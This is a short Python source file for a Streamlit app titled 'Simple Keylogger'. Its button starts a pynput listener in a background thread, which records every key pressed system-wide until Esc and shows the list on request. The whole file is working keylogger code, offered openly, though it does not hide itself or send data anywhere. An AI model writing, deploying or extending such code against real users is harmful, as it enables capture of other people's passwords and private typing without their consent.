# keylogger_streamlit.py
import streamlit as st
from pynput import keyboard
import threading

# Global variable to store captured keys
captured_keys = []

# Keylogger function
def keylogger():
    def on_press(key):
        try:
            captured_keys.append(f'Key {key.char} pressed')
        except AttributeError:
            captured_keys.append(f'Special key {key} pressed')

    def on_release(key):
        if key == keyboard.Key.esc:
            return False  # Stop the listener

    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Streamlit UI
st.title("Simple Keylogger")

if st.button("Start Keylogger"):
    # Start the keylogger in a separate thread
    threading.Thread(target=keylogger, daemon=True).start()
    st.write("Keylogger is running...")

# Display captured keys
if st.button("Show Captured Keys"):
    st.write(captured_keys)
